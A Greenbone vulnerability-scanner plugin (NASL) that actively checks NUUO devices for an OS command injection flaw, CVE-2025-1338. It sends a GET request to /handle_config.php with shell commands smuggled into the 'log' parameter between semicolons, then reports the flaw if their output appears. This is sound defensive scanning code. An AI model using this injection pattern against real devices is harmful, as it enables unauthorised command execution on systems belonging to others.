# SPDX-FileCopyrightText: 2025 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nuuo:nuuo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.154079");
  script_version("2025-03-03T06:02:39+0000");
  script_tag(name:"last_modification", value:"2025-03-03 06:02:39 +0000 (Mon, 03 Mar 2025)");
  script_tag(name:"creation_date", value:"2025-02-26 09:09:42 +0000 (Wed, 26 Feb 2025)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2025-02-16 11:15:09 +0000 (Sun, 16 Feb 2025)");

  script_cve_id("CVE-2025-1338");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("NUUO Devices OS Command Injection Vulnerability (Feb 2025) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2025 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_http_detect.nasl");
  script_mandatory_keys("nuuo/device/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"NUUO devices are prone to an OS command injection
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"This vulnerability affects the function print_file of the file
  /handle_config.php. The manipulation of the argument log leads to command injection.");

  script_tag(name:"solution", value:"No known solution is available as of 26th February, 2025.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://vuldb.com/?submit.493912");
  script_xref(name:"URL", value:"https://pan.baidu.com/s/1YW52iM0ehUfFKa_CiTHBjQ?pwd=kqec");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

cmds = exploit_commands("linux");

foreach pattern (keys(cmds)) {
  url = "/handle_config.php?log=;" + cmds[pattern] + ";";

  req = http_get(port: port, item: url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (result = egrep(pattern: pattern, string: res)) {
    report = "It was possible to execute the '" + cmds[pattern] + "' command via '" +
             http_report_vuln_url(port: port, url: url, url_only: TRUE) + "'." +
             '\n\nResult:\n\n' + chomp(result);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
